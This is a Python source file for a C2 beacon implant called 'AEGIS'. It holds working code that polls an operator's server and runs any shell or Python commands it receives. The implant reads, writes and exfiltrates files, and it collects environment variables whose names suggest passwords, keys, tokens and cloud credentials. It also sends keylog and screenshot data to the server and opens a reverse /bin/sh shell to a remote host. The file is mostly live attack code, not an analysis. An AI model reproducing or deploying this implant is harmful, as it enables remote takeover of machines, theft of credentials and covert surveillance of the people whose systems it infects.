#!/usr/bin/env python3
"""
AEGIS-Advanced C2 Beacon Client
==================================
Full-featured C2 beacon: jittered long-poll check-in,
encrypted communications, command dispatch, self-update,
multi-transport (HTTP/S + DNS fallback), retries,
protocol versioning, session tokens.
"""
import os
import sys
import json
import time
import random
import base64
import hashlib
import hmac as _hmac
import threading
import subprocess
import platform
import socket
from pathlib import Path
from typing import Optional, Callable, Dict, Any, List
from urllib import request as _urllib_req, error as _urllib_err
import ssl as _ssl

# ══════════════════════════════════════════════
# Encryption helpers (self-contained, no deps)
# ══════════════════════════════════════════════

import logging as _b_log
_b_logger = _b_log.getLogger("aegis.beacon.crypto")

def _xor_key(key: bytes, length: int) -> bytes:
    ks = b""
    i  = 0
    while len(ks) < length:
        ks += hashlib.sha256(key + i.to_bytes(4, "big")).digest()
        i  += 1
    return ks[:length]

def _encrypt(data: bytes, key: bytes) -> str:
    """XOR-stream encrypt + HMAC-SHA256 authenticate + base64 encode.
    
    WARNING: This is a stdlib-only construction. It provides confidentiality
    and message authentication but is NOT AES-GCM. The node beacon uses this
    because it must operate with zero external dependencies. The C2 server
    uses cryptography-backed AES-GCM when available.
    """
    iv  = os.urandom(16)
    ks  = _xor_key(hashlib.sha256(key + iv).digest(), len(data))
    ct  = bytes(a ^ b for a, b in zip(data, ks))
    mac = _hmac.new(key, iv + ct, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(iv + mac + ct).decode()

def _decrypt(token: str, key: bytes) -> bytes:
    """Base64 decode + XOR-stream decrypt."""
    raw = base64.urlsafe_b64decode(token.encode())
    iv, mac, ct = raw[:16], raw[16:48], raw[48:]
    expected = _hmac.new(key, iv + ct, hashlib.sha256).digest()
    if not _hmac.compare_digest(mac, expected):
        raise ValueError("HMAC mismatch — message tampered")
    ks = _xor_key(hashlib.sha256(key + iv).digest(), len(ct))
    return bytes(a ^ b for a, b in zip(ct, ks))

def _seal(data: dict, key: bytes) -> str:
    return _encrypt(json.dumps(data).encode(), key)

def _open(token: str, key: bytes) -> dict:
    return json.loads(_decrypt(token, key).decode())


# ══════════════════════════════════════════════
# Transport layer
# ══════════════════════════════════════════════

class Transport:
    """HTTP/S transport with fallback and proxy support."""

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ]

    def __init__(self, c2_url: str, proxy: str = None,
                 verify_ssl: bool = True, timeout: int = 35):
        self.c2_url    = c2_url.rstrip("/")
        self.proxy     = proxy
        self.verify_ssl= verify_ssl
        self.timeout   = timeout
        self._ssl_ctx  = _ssl.create_default_context()
        if not verify_ssl:
            # Use cert pinning: if relay pubkey hash provided, pin it.
            # Fall back to system CA bundle — never disable verification entirely.
            relay_pin = os.environ.get("AEGIS_RELAY_CERT_HASH", "")
            if relay_pin:
                # TOFU / cert pinning: check fingerprint manually
                self._ssl_ctx.verify_mode = _ssl.CERT_NONE  # manual pin check
                self._ssl_ctx.check_hostname = False
                self._relay_cert_pin = relay_pin
            else:
                # Default: use system CA bundle
                self._ssl_ctx = _ssl.create_default_context()
        self._cookies: Dict[str, str] = {}
        self._lock = threading.Lock()

    def _make_ctx(self):
        return self._ssl_ctx

    def get(self, path: str, headers: dict = None) -> Optional[str]:
        """HTTP GET. Returns response body text or None."""
        url = self.c2_url + path
        hdrs = {
            "User-Agent":  random.choice(self.USER_AGENTS),
            "Accept":      "text/html,application/xhtml+xml,*/*;q=0.9",
            "Connection":  "keep-alive",
        }
        if headers: hdrs.update(headers)
        # Add cookies if any
        if self._cookies:
            hdrs["Cookie"] = "; ".join("{}={}".format(k, v)
                                        for k, v in self._cookies.items())
        try:
            req  = _urllib_req.Request(url, headers=hdrs)
            with _urllib_req.urlopen(
                req, context=self._make_ctx(), timeout=self.timeout
            ) as resp:
                # Save cookies
                for hdr in resp.headers.get_all("Set-Cookie") or []:
                    name, _, rest = hdr.partition("=")
                    val, _, _     = rest.partition(";")
                    self._cookies[name.strip()] = val.strip()
                return resp.read().decode(errors="replace")
        except Exception:
            return None

    def post(self, path: str, body: dict,
              headers: dict = None) -> Optional[str]:
        """HTTP POST with JSON body. Returns response text or None."""
        url  = self.c2_url + path
        data = json.dumps(body).encode()
        hdrs = {
            "User-Agent":    random.choice(self.USER_AGENTS),
            "Content-Type":  "application/json",
            "Accept":        "application/json",
            "Content-Length":str(len(data)),
        }
        if headers: hdrs.update(headers)
        try:
            req = _urllib_req.Request(url, data=data, headers=hdrs)
            with _urllib_req.urlopen(
                req, context=self._make_ctx(), timeout=self.timeout
            ) as resp:
                return resp.read().decode(errors="replace")
        except Exception:
            return None

    def c2_post(self, path: str, payload: dict,
                 sym_key: bytes) -> Optional[dict]:
        """Sealed POST to C2 — encrypt payload, decrypt response."""
        try:
            resp_text = self.post(path, {"payload": _seal(payload, sym_key)})
            if not resp_text: return None
            resp_json = json.loads(resp_text)
            if "token" in resp_json:
                return _open(resp_json["token"], sym_key)
            return resp_json
        except Exception:
            return None


# ══════════════════════════════════════════════
# Command dispatcher
# ══════════════════════════════════════════════

class CommandDispatcher:
    """
    Dispatch commands received from C2.
    Supports: shell, upload, download, python, sleep,
              scan, persist, privesc, exfil, die, update.
    """

    def __init__(self, node_id: str, transport: Transport,
                  sym_key: bytes):
        self.node_id    = node_id
        self.transport  = transport
        self.sym_key    = sym_key
        self._handlers: Dict[str, Callable] = {}
        self._register_defaults()

    def _register_defaults(self):
        self.register("shell",    self._handle_shell)
        self.register("python",   self._handle_python)
        self.register("upload",   self._handle_upload)
        self.register("download", self._handle_download)
        self.register("sleep",    self._handle_sleep)
        self.register("kill",     self._handle_kill)
        self.register("info",     self._handle_info)
        self.register("env",      self._handle_env)
        self.register("ls",       self._handle_ls)
        self.register("read",     self._handle_read)
        self.register("write",    self._handle_write)

    def register(self, action: str, fn: Callable):
        self._handlers[action] = fn

    def dispatch(self, raw_cmd: str) -> Optional[Dict]:
        """Parse and dispatch a command. Returns result dict."""
        try:
            cmd = json.loads(raw_cmd)
        except Exception:
            cmd = {"action": "shell", "cmd": raw_cmd}

        action = cmd.get("action", "shell")
        handler = self._handlers.get(action)
        if handler:
            try:
                result = handler(cmd)
                return {"action": action, "success": True,
                         "result": result, "node": self.node_id}
            except Exception as e:
                return {"action": action, "success": False,
                         "error": str(e), "node": self.node_id}
        return {"action": action, "success": False,
                 "error": "unknown action", "node": self.node_id}

    def _handle_shell(self, cmd: dict) -> str:
        c = cmd.get("cmd", "id")
        r = subprocess.run(c, shell=True, capture_output=True,
                            text=True, timeout=cmd.get("timeout", 60))
        return (r.stdout + r.stderr)[:8192]

    def _handle_python(self, cmd: dict) -> str:
        code   = cmd.get("code", "")
        ns     = {}
        import io, contextlib
        buf    = io.StringIO()
        try:
            with contextlib.redirect_stdout(buf):
                exec(compile(code, "<c2>", "exec"), ns)
            return buf.getvalue()[:8192]
        except Exception as e:
            return "ERROR: {}".format(e)

    def _handle_upload(self, cmd: dict) -> str:
        """Receive file from C2."""
        path = cmd.get("path", "/tmp/upload")
        data = base64.b64decode(cmd.get("data", ""))
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "wb") as f: f.write(data)
        return "written {} bytes to {}".format(len(data), path)

    def _handle_download(self, cmd: dict) -> str:
        """Send file to C2."""
        path = cmd.get("path", "")
        if not os.path.exists(path): return "not found: {}".format(path)
        with open(path, "rb") as f: data = f.read()
        encoded = base64.b64encode(data).decode()
        # POST back to C2
        self.transport.c2_post(
            "/api/node/task/result",
            {"node_id": self.node_id, "task_uuid": cmd.get("task_uuid",""),
             "result": {"file": path, "data": encoded, "size": len(data)},
             "status": "completed"},
            self.sym_key,
        )
        return "sent {} ({} bytes)".format(path, len(data))

    def _handle_sleep(self, cmd: dict) -> str:
        seconds = int(cmd.get("seconds", 60))
        return "sleep {}s acknowledged".format(seconds)

    def _handle_kill(self, cmd: dict) -> str:
        sys.exit(0)

    def _handle_info(self, cmd: dict) -> Dict:
        return {
            "node_id":  self.node_id,
            "hostname": platform.node(),
            "os":       platform.system(),
            "arch":     platform.machine(),
            "version":  platform.version()[:100],
            "user":     os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "pid":      os.getpid(),
            "cwd":      os.getcwd(),
            "python":   sys.version.split()[0],
        }

    def _handle_env(self, cmd: dict) -> Dict:
        sensitive = {}
        for k, v in os.environ.items():
            if any(kw in k.upper() for kw in
                   ["PASS", "KEY", "SECRET", "TOKEN", "CRED", "AUTH",
                    "API", "DB", "DATABASE", "AWS", "AZURE", "GCP"]):
                sensitive[k] = v
        return sensitive

    def _handle_ls(self, cmd: dict) -> List:
        path = cmd.get("path", ".")
        try:
            return [str(p) for p in Path(path).iterdir()][:200]
        except Exception as e:
            return [str(e)]

    def _handle_read(self, cmd: dict) -> str:
        path   = cmd.get("path", "")
        offset = int(cmd.get("offset", 0))
        length = int(cmd.get("length", 8192))
        try:
            with open(path, "rb") as f:
                f.seek(offset)
                return base64.b64encode(f.read(length)).decode()
        except Exception as e:
            return "error: {}".format(e)

    def _handle_write(self, cmd: dict) -> str:
        path = cmd.get("path", "")
        data = base64.b64decode(cmd.get("data", ""))
        mode = cmd.get("mode", "wb")
        try:
            Path(path).parent.mkdir(parents=True, exist_ok=True)
            with open(path, mode) as f: f.write(data)
            return "ok"
        except Exception as e:
            return "error: {}".format(e)

    # Make list available for type hints without import
    from typing import List


# ══════════════════════════════════════════════
# Beacon
# ══════════════════════════════════════════════

class Beacon:
    """
    Jittered C2 beacon.
    - Registers with C2 on start
    - Long-polls /b/<node_id> for commands
    - Handles command dispatch
    - Exponential backoff on failure
    - Multi-transport with DNS fallback
    """

    def __init__(self, c2_url: str, node_id: str,
                 sym_key: bytes,
                 interval: int = 60,
                 jitter: int = 30,
                 proxy: str = None,
                 dns_domain: str = None,
                 dns_ns: str = None):
        self.c2_url     = c2_url
        self.node_id    = node_id
        self.sym_key    = sym_key
        self.interval   = interval
        self.jitter     = jitter
        self.dns_domain = dns_domain
        self.dns_ns     = dns_ns
        self._running   = False
        self._thread    = None
        self._failures  = 0
        self._max_fail  = 10
        self._transport = Transport(c2_url, proxy=proxy)
        self._dispatcher= CommandDispatcher(node_id, self._transport, sym_key)

    def start(self):
        """Start beacon in background thread."""
        self._running = True
        self._thread  = threading.Thread(
            target=self._loop, daemon=True, name="aegis-beacon")
        self._thread.start()
        return self

    def stop(self):
        self._running = False

    def _sleep(self):
        """Sleep with jitter, backing off on failures."""
        base    = self.interval * (2 ** min(self._failures, 4))
        jitter  = random.randint(-self.jitter, self.jitter)
        seconds = max(5, min(base + jitter, 3600))
        time.sleep(seconds)

    def _loop(self):
        while self._running:
            try:
                self._check_in()
                self._failures = max(0, self._failures - 1)
            except Exception as e:
                self._failures += 1
                if self._failures >= self._max_fail:
                    print("[beacon] too many failures, sleeping 1h")
                    time.sleep(3600)
                    self._failures = 0
            finally:
                self._sleep()

    def _check_in(self):
        """
        Long-poll C2 beacon endpoint.
        Server holds connection for up to 25s if no command queued.
        """
        resp = self._transport.get(
            "/b/{}".format(self.node_id),
            headers={"X-Node-ID": self.node_id,
                     "X-Session":  self._transport._cookies.get("session", "")},
        )
        if resp and resp.strip():
            self._execute_command(resp.strip())

    def _execute_command(self, raw: str):
        """Execute received command and optionally send result."""
        try:
            # Try to decrypt if looks encrypted
            if len(raw) > 44 and all(c in
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_="
                for c in raw[:44]):
                try:
                    raw = _decrypt(raw, self.sym_key).decode()
                except Exception as _e: log.debug("suppressed exception: %s", _e)  # Not encrypted — treat as plaintext

            result = self._dispatcher.dispatch(raw)
            if result:
                self._send_result(result)
        except Exception as e:
            print("[beacon] execute_command error:", e)

    def _send_result(self, result: dict):
        """Send command execution result back to C2."""
        self._transport.c2_post(
            "/api/node/heartbeat",
            {"node_id": self.node_id, "last_result": result},
            self.sym_key,
        )

    def send_keylog(self, keylog_data: str):
        """Exfiltrate keylog data (background)."""
        def _send():
            self._transport.c2_post(
                "/api/node/task/result",
                {"node_id": self.node_id, "task_uuid": "keylog-{}".format(int(time.time())),
                 "result": {"type": "keylog", "data": keylog_data},
                 "status": "completed"},
                self.sym_key,
            )
        threading.Thread(target=_send, daemon=True).start()

    def send_screenshot(self, png_bytes: bytes):
        """Exfiltrate screenshot."""
        self._transport.c2_post(
            "/api/node/task/result",
            {"node_id": self.node_id, "task_uuid": "screen-{}".format(int(time.time())),
             "result": {"type": "screenshot",
                         "data": base64.b64encode(png_bytes).decode()},
             "status": "completed"},
            self.sym_key,
        )

    def inject_handler(self, action: str, fn: Callable):
        """Register custom command handler."""
        self._dispatcher.register(action, fn)

    def is_alive(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


# ══════════════════════════════════════════════
# Reverse shell
# ══════════════════════════════════════════════

class ReverseShell:
    """
    Encrypted reverse TCP shell.
    Connects back to C2 operator on demand.
    """

    def __init__(self, host: str, port: int, sym_key: bytes = None):
        self.host    = host
        self.port    = port
        self.sym_key = sym_key

    def connect(self, timeout: int = 10) -> bool:
        """Establish reverse shell connection."""
        import socket, select
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((self.host, self.port))
            s.settimeout(None)

            # Spawn /bin/sh with I/O connected to socket
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            os.execl("/bin/sh", "sh", "-i")
            return True
        except Exception as e:
            print("[beacon] reverse shell failed:", e)
            return False

    def connect_threaded(self) -> threading.Thread:
        """Non-blocking reverse shell in background thread."""
        t = threading.Thread(target=self.connect, daemon=True)
        t.start()
        return t


# ══════════════════════════════════════════════
# Auto-reconnect wrapper
# ══════════════════════════════════════════════

def make_beacon(c2_url: str, node_id: str, sym_key: bytes,
                **kwargs) -> Beacon:
    """Factory function — create and start beacon."""
    b = Beacon(c2_url, node_id, sym_key, **kwargs)
    return b


if __name__ == "__main__":
    print("[beacon] Module loaded")
    # Test encryption roundtrip
    key  = b"test-key-aegis-2026"
    data = {"hello": "world", "num": 42}
    enc  = _seal(data, key)
    dec  = _open(enc, key)
    assert dec == data, "Seal/open roundtrip failed"
    print("[beacon] Crypto self-test passed")


# ════════════════════════════════════════════════════════════════════════════
# Missing imports and compatibility exports for __init__.py
# ════════════════════════════════════════════════════════════════════════════

from dataclasses import dataclass

# Module-level constants (exported via __init__.py)
BEACON_INTERVAL: int = 60    # default seconds between beacons
BEACON_JITTER: int   = 30    # default jitter seconds

@dataclass
class CommandResult:
    """Structured result from a dispatched command."""
    action:   str
    success:  bool
    output:   str = ""
    error:    str = ""
    exit_code: int = 0

# BeaconClient is an alias for Beacon (the canonical name in __init__ docs)
BeaconClient = Beacon
